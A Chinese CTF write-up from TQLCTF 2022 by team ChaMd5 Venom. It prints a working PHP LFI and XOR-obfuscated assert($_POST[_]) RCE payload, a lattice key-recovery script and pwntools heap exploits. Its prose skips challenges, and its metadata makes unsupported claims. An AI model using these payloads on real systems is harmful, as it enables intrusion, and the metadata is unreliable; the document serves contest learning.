---
title: TQLCTF WriteUp - ChaMd5 Venom
contest: TQLCTF
year: 2022
team: ChaMd5 Venom
difficulty: medium
vuln_type: web_unknown
tags:
- php-lfi
- php-template-write
- xor-rce
- lattice-attack
- nesemu-exploit
attack_chain:
- /get_pic.php?image=/etc/passwd LFI
- 注册 + 4 字段写入 sandbox/<md5(user)>.php
- user=1)/* website=*/;__PUNC__/* punctuation=无字母数字 RCE
- $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`')='assert
- $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']')='_POST
- $_($___[_]) → assert($_POST[_])
- 'Lattice attack: 128 维 IntegerLattice LLL reduce + Gram-Schmidt'
- grad_desc(0.7, 128, samples) 梯度下降 4 维找 4 个短向量
- babai pklll gram pkgram target 还原私钥
- 'pwn menu: add/delete + size 负数 + 伪造 fake_chunk 0x70'
- tcache stash unlink + main_arena leak
- 'nemu'' 调试器: 写 0x86A3FC0 地址到 libc 区域 + og=0x4527a one_gadget'
- edit_score' race 改 write_time
key_payload: assert($_POST[_])  // 无字母 RCE
one_liner: TQLCTF 2022 ChaMd5 Venom：PHP 无字母 RCE + 128 维 lattice + Nemu 调试器栈迁移。
lesson: LLL + 梯度下降 4 维可以恢复 lattice 私钥的 4 个基向量；pwnable 中 nesemu 是稀有 IoT 模拟。
quality: medium
full_path: TQLCTF-WriteUp.full.md
meta_path: TQLCTF-WriteUp.meta.md
images_removed: true
images_removed_count: 8
schema_version: v3.0.0-P0
summary: TQLCTF WriteUp - ChaMd5 Venom。TQLCTF 2022 ChaMd5 Venom：PHP 无字母 RCE + 128 维 lattice + Nemu 调试器栈迁移。。关键路径：/get_pic.php?image=/etc/passwd LFI → 注册 + 4 字段写入 sandbox/<md5(user)>.php → user=1)/* website=*...
category: web
subcategory: web_other
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 8
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/27072.html
reasoning_chain:
- /get_pic.php?image=/etc/passwd → 触发点：LFI 漏洞无路径校验
- 假设：注册流程会写入 sandbox/<md5(user)>.php → 动作：注册 username 含 PHP 代码控制 4 个字段
- 观察：user 限制 ≤ 6 字 + 字符集 [^w/()*<>] + website ≤ 25 字 + [^w/*:.;()n<>] → 假设：无字母数字 bypass
- 动作：'%01'^'`' 等不可打印字符 XOR 还原 assert / _POST → 拼成 assert($_POST[_]) → RCE
- Lattice attack 题目：128 维 IntegerLattice → 假设：私钥可由 4 个短向量基恢复
- 动作：LLL reduce + 梯度下降 4 维找 4 个短向量 → Babai 最近向量算法还原私钥
failed_attempts:
- 试图用 user 写 <?php system('id');?> → 失败：user 限制 6 字符且无字母数字
- 试图 2 维 LLL → 失败：维度不够还原 128 维 lattice
key_observations:
- PHP 无字母数字 RCE 核心是 ^ XOR 还原字母（%01-1F 与 ` 等）
- LLL 梯度下降 4 维可恢复 128 维 lattice 私钥
- pwnable 中 nesemu 是稀有 IoT 模拟器，pwntools 没有直接支持
prerequisites:
- PHP 字符 XOR 不可打印绕过技巧
- Lattice LLL + Babai 最近向量算法
- pwnable 堆 pwn 基础（tcache stash / main_arena leak）
---
# TQLCTF-WriteUp

> 原文: https://www.ctfiot.com/27072.html
> ID: 27072

Web

Simple PHP

注册登录，/get_pic.php?image=/etc/passwd存在 LFI

<?php
//  index.php
error_reporting(0);
if(isset($_POST['user']) && isset($_POST['pass'])){
 $hash_user = md5($_POST['user']);
 $hash_pass = 'zsf'.md5($_POST['pass']);
 if(isset($_POST['punctuation'])){
  //filter
  if (strlen($_POST['user']) > 6){
   echo("<script>alert('Username is too long!');</script>");
  }
  elseif(strlen($_POST['website']) > 25){
   echo("<script>alert('Website is too long!');</script>");
  }
  elseif(strlen($_POST['punctuation']) > 1000){
   echo("<script>alert('Punctuation is too long!');</script>");
  }
  else{
   if(preg_match('/[^w/()*<>]/', $_POST['user']) === 0){
    if (preg_match('/[^w/*:.;()n<>]/', $_POST['website']) === 0){
     $_POST['punctuation'] = preg_replace("/[a-z,A-Z,0-9>?]/","",$_POST['punctuation']);
     $template = file_get_contents('./template.html');
     $content = str_replace("__USER__", $_POST['user'], $template);
     $content = str_replace("__PASS__", $hash_pass, $content);
     $content = str_replace("__WEBSITE__", $_POST['website'], $content);
     $content = str_replace("__PUNC__", $_POST['punctuation'], $content);
     file_put_contents('sandbox/'.$hash_user.'.php', $content);
     echo("<script>alert('Successed!');</script>");
    }
    else{
     echo("<script>alert('Invalid chars in website!');</script>");
    }
   }
   else{
    echo("<script>alert('Invalid chars in username!');</script>");
   }
  }
 }
 else{
  setcookie("user", $_POST['user'], time()+3600);
  setcookie("pass", $hash_pass, time()+3600);
  Header("Location:
sandbox/$hash_user.php");
 }
}
?>

<!doctype html>
<html lang="zh">
<head>
 <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Simple Linux</title>
 <link rel="stylesheet" type="text/css" href="css/styles.css">
 <!--[if IE]>
  <script src="http://libs.baidu.com/html5shiv/3.7/html5shiv.min.js"></script>
 <![endif]-->
</head>

 
  
   
    <label for="tab-1" class="tab">Sign In</label>
    <label for="tab-2" class="tab">Sign Up</label>
    
     <form action="index.php" method="post">
      
       
        <label for="user" class="label">Username</label>
        
       
       
        <label for="pass" class="label">Password</label>
        
       
       <!-- 
        
        <label for="check"> Keep me Signed in</label>
        -->
       
        
       
       
       <!-- 
        [Forgot Password?](#forgot)
        -->
      
     </form>
     <form action="index.php" method="post">
      
       
        <label for="user" class="label">Username</label>
        
       
       
        <label for="pass" class="label">Password</label>
        
       
       
        <label for="pass" class="label">Your Website</label>
        
       
       
        <label for="pass" class="label">Your Punctuation</label>
        
       
       
        
       
       
       
        <label for="tab-1">Already Member?</a>
       
      
     </form>
    
   
  
 
 

</html>

//  template.html 
 <a title="开始" id="start_btn"></a>
    
      
        <li>
  <?php
   error_reporting(0);
   $user = ((string)__USER__);
   $pass = ((string)__PASS__);
   
   if(isset($_COOKIE['user']) && isset($_COOKIE['pass']) && $_COOKIE['user'] === $user && $_COOKIE['pass'] === $pass){
    echo($_COOKIE['user']);
   }
   else{
    die("<script>alert('Permission denied!');</script>");
   }
  ?>
  </li>
      
      
        <li>系统设置</li>
        <li>使用指南 </li>
        <li>关于我们</li>
        <li>退出系统</li>
      
    
  

[__PUNC__](#)

  <li class="desktop_icon" id="win5" path="https://image.baidu.com/"> 
    图片
      
    
  </li>
  <li class="desktop_icon" id="win6" path="http://www.4399.com/"> 
    游戏
      
    
  </li>
  <li class="desktop_icon" id="win10" path="../get_pic.php?image=img/haokangde.png"> 
    好康的
      
    
  </li>
  <li class="desktop_icon" id="win16" path="__WEBSITE__"> 
    你的网站
      
    
  </li>




  [](#)
  [](#) 
  
    
  




</html>

<?php
//  get_pic.php
error_reporting(0);
$image = (string)$_GET['image'];
echo '  ';

分析index.php和template.html不难发现，代码逻辑是加载我们注册时的四个变量拼接写入文件 此时我们让

user=1)/*注释掉后面多余的信息

pass 是拼接md5 之后的值 没什么用

website=*/;__PUNC__/*完成前面的注释并引入__PUNC__注释后面的信息

由于 punctuation 的正则，这道题就变成了无字母数字RCE

因此构造一个 payload, 即可 RCE

最终得到 flag

m 还是很小的 直接选择爆破

直接打开是乱码，编码问题，用 vim 打开是正常的

最后几个字符，就很明显了，维吉尼亚，找个无密钥揭秘的工具

关注公众号https://mp.weixin.qq.com/s/eMqFQ-qEE1ROzjVDqj-B1Q, 改一下 html 源码，时间长点

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
<?php
//  index.php
error_reporting(0);
if(isset($_POST['user']) && isset($_POST['pass'])){
 $hash_user = md5($_POST['user']);
 $hash_pass = 'zsf'.md5($_POST['pass']);
 if(isset($_POST['punctuation'])){
  //filter
  if (strlen($_POST['user']) > 6){
   echo("<script>alert('Username is too long!');</script>");
  }
  elseif(strlen($_POST['website']) > 25){
   echo("<script>alert('Website is too long!');</script>");
  }
  elseif(strlen($_POST['punctuation']) > 1000){
   echo("<script>alert('Punctuation is too long!');</script>");
  }
  else{
   if(preg_match('/[^w/()*<>]/', $_POST['user']) === 0){
    if (preg_match('/[^w/*:.;()n<>]/', $_POST['website']) === 0){
     $_POST['punctuation'] = preg_replace("/[a-z,A-Z,0-9>?]/","",$_POST['punctuation']);
     $template = file_get_contents('./template.html');
     $content = str_replace("__USER__", $_POST['user'], $template);
     $content = str_replace("__PASS__", $hash_pass, $content);
     $content = str_replace("__WEBSITE__", $_POST['website'], $content);
     $content = str_replace("__PUNC__", $_POST['punctuation'], $content);
     file_put_contents('sandbox/'.$hash_user.'.php', $content);
     echo("<script>alert('Successed!');</script>");
    }
    else{
     echo("<script>alert('Invalid chars in website!');</script>");
    }
   }
   else{
    echo("<script>alert('Invalid chars in username!');</script>");
   }
  }
 }
 else{
  setcookie("user", $_POST['user'], time()+3600);
  setcookie("pass", $hash_pass, time()+3600);
  Header("Location:
sandbox/$hash_user.php");
 }
}
?>

<!doctype html>
<html lang="zh">
<head>
 <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Simple Linux</title>
 <link rel="stylesheet" type="text/css" href="css/styles.css">
 <!--[if IE]>
  <script src="http://libs.baidu.com/html5shiv/3.7/html5shiv.min.js"></script>
 <![endif]-->
</head>

 
  
   
    <label for="tab-1" class="tab">Sign In</label>
    <label for="tab-2" class="tab">Sign Up</label>
    
     <form action="index.php" method="post">
      
       
        <label for="user" class="label">Username</label>
        
       
       
        <label for="pass" class="label">Password</label>
        
       
       <!-- 
        
        <label for="check"> Keep me Signed in</label>
        -->
       
        
       
       
       <!-- 
        [Forgot Password?](#forgot)
        -->
      
     </form>
     <form action="index.php" method="post">
      
       
        <label for="user" class="label">Username</label>
        
       
       
        <label for="pass" class="label">Password</label>
        
       
       
        <label for="pass" class="label">Your Website</label>
        
       
       
        <label for="pass" class="label">Your Punctuation</label>
        
       
       
        
       
       
       
        <label for="tab-1">Already Member?</a>
       
      
     </form>
    
   
  
 
 

</html>
//  template.html 
 <a title="开始" id="start_btn"></a>
    
      
        <li>
  <?php
   error_reporting(0);
   $user = ((string)__USER__);
   $pass = ((string)__PASS__);
   
   if(isset($_COOKIE['user']) && isset($_COOKIE['pass']) && $_COOKIE['user'] === $user && $_COOKIE['pass'] === $pass){
    echo($_COOKIE['user']);
   }
   else{
    die("<script>alert('Permission denied!');</script>");
   }
  ?>
  </li>
      
      
        <li>系统设置</li>
        <li>使用指南 </li>
        <li>关于我们</li>
        <li>退出系统</li>
      
    
  

[__PUNC__](#)

  <li class="desktop_icon" id="win5" path="https://image.baidu.com/"> 
    图片
      
    
  </li>
  <li class="desktop_icon" id="win6" path="http://www.4399.com/"> 
    游戏
      
    
  </li>
  <li class="desktop_icon" id="win10" path="../get_pic.php?image=img/haokangde.png"> 
    好康的
      
    
  </li>
  <li class="desktop_icon" id="win16" path="__WEBSITE__"> 
    你的网站
      
    
  </li>




  [](#)
  [](#) 
  
    
  




</html>
<?php
//  get_pic.php
error_reporting(0);
$image = (string)$_GET['image'];
echo '  ';
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
from sage.modules.free_module_integer import IntegerLattice

class grad_desc:
 def __init__(self, delta, n, ss):
  assert ss.ncols() == n
  self.n = n
  self.delta = delta
  self.samples = ss
  self.nsamples = ss.nrows()
  
 def gen_vector(self, n, i):
  vec = [0 for _ in range(n)]
  vec[i] = 0.85
  return vector(RR,vec)
  
 def mom4(self, w): # estimate the kurtosis
  return (1/self.nsamples) * sum([x^4 for x in (self.samples*w)])

 def grad_mom4(self, w): # estimate the gradient of the kurtosis
  return (4/self.nsamples) * 
   sum([dot^(3)*vi for (dot,vi) in zip((self.samples*w), self.samples)])
  
 def run(self, pos): # do the gradient descent
  slow = self.delta * 10^-3
  # 1: pick w0 at random from unit sphere in RR^n
  w_new = self.gen_vector(self.n, pos)
  w_new /= norm(w_new)
  while 1:
   w = w_new
   # 2: grad mom_4(w) from empirical distribution
   g = self.grad_mom4(w)
   # 3. descent
   w_new = w - self.delta * g
   # 4. normalize w_new
   w_new /= norm(w_new)
   # 5. check and return
   m4new = self.mom4(w_new)
   m4 = self.mom4(w)
   if m4 - m4new < slow:
    return w

def babai(lattice, gram, target):
 t = target
 for i in reversed(range(lattice.nrows())):
  c = ((t * gram[i]) / (gram[i] * gram[i])).round()
  t -= lattice[i] * c
 return target - t

pk = load("pk")
sigs = load("signatures")
print("Load Finish")

pklll = IntegerLattice(pk, lll_reduce=True).reduced_basis
pkgram = pklll.gram_schmidt()[0]
print("LLL Finish")

n_samples = 0
samples = []
for sig in sigs:
 samples.append(2*sig[1])
 n_samples+=1
samples = matrix(samples)

G = (3/n_samples) * (samples.transpose() * samples)
print("G calculated")
save(G, 'G')
L = G.inverse().cholesky().n() # in AA. need to convert to finite precision ( .n() ) or later it'll take forever...
print("L calculated")
save(L, 'L')
samples_hypercube = samples * L
print("samples_hypercube calculated")
save(samples_hypercube, 'samples_hypercube')

basis = []
gd = grad_desc(0.7, 128, samples_hypercube)

for i in range(128):
 w = gd.run(i)
 print(i, "GradDesc", w)
 v = vector(map(round, w*L.inverse()))
 print(i, "Found vector", v)
 sol = babai(pklll, pkgram, v)
 print(i, "Basis vector", sol)
 basis += [sol]

sk = matrix(ZZ, basis)
save(sk, 'sk')
# _*_ coding:
utf-8 _*_
from pwn import *

context.terminal=['tmux', 'splitw', '-h']

prog = '/home/ctf/pwn'
p = remote("119.23.255.127", 25799)#nc 124.71.130.185 49155
# p = remote("127.0.0.1", 9999)#nc 124.71.130.185 49155
context.log_level = 'debug'

def choice(idx):
    p.sendlineafter("> ",str(idx))

def add(sz,con):
    choice(1)
    sleep(0.1)
    p.sendline(str(sz))
    sleep(0.1)
    p.sendline(con)
    # sa("content?",cno)

def delete(idx):
    choice(2)
    sleep(0.1)
    p.sendline(str(idx))

def exp():
    add(0x90,p64(0)*3+p64(0x400))

    add(0x280,'init-0')
    
    for i in range(16):
        add(i*0x10+0xa0,(p64(0)+p64(0)+p64(0)+p64(0x21)+(p64(0)+p64(0x61))*((i*0x10+0x70)/0x10)))
    delete(-0x290)
    fake_t = p16(7)*8*3
    choice(2)
    add(0x280,fake_t)

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*8+p8(0xe0)
    add(0x280,fake_t)
    # add(0x50,'a')
    add(0x90,'a')
    
    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*10+p8(0xc0)
    add(0x280,fake_t)   
    add(0xb0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*11+p8(0x80)
    add(0x280,fake_t)   
    add(0xc0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*12+p8(0x50)
    add(0x280,fake_t)   
    add(0xd0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*13+p8(0x30)
    add(0x280,fake_t)   
    add(0xe0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*14+p8(0x20)
    add(0x280,fake_t)   
    add(0xf0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*15+p8(0x20)
    add(0x280,fake_t)   
    add(0x100,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*16+p8(0x30)
    add(0x280,fake_t)   
    add(0x110,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*40
    add(0x280,fake_t)   

    pay = 0x3d0*'a'+p64(0)+p64(0x21)+p64(0x404070)

    add(0x3f0,pay)

    add(0x10,'a')

    p.interactive()

exp()
# _*_ coding:
utf-8 _*_
from pwn import *

context.terminal=['tmux', 'splitw', '-h']

prog = './nemu'
p = remote("47.107.29.210", 36088)#nc 124.71.130.185 49155
# p = remote("127.0.0.1", 9999)#nc 124.71.130.185 49155
context.log_level = 'debug'

def choice(idx):
    p.sendlineafter("> ",str(idx))

def add(sz,con):
    choice(1)
    sleep(0.1)
    p.sendline(str(sz))
    sleep(0.1)
    p.sendline(con)
    # sa("content?",cno)

def delete(idx):
    choice(2)
    sleep(0.1)
    p.sendline(str(idx))

def exp():
    pool = 0x6a3b80
    p.sendlineafter("(nemu) ",'x 5 '+str(8000030))
    p.recvuntil("0x08000040t0x")
    heap = int(p.recv(8),16)
    print("[++++++++++]",heap)
    #                                       #

    p.sendlineafter("(nemu) ",'x 10 '+hex(0x3d8+heap-pool)[2:])
    p.recvuntil("t0x")
    l1 = int(p.recv(8),16)
    p.recvuntil("t0x")
    l2 = int(p.recv(8),16)
    libcof = l1+l2*0x100000000
    #                                       #
    addr = libcof - 0x3c4ce8
    print("[++++++++++]",addr)
    og = addr + 0x4527a
    
    p.sendlineafter("(nemu) ",'set '+ str(0x86A3FC0-pool) + ' ' + '0x60f078')
    p.sendlineafter("(nemu) ",'set '+ str(0x86A3FC0-pool+4) + ' ' + str((0x60f078)>>32))
    p.sendlineafter("(nemu) ",'w 0x'+hex(og)[6:])

    p.interactive()

exp()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]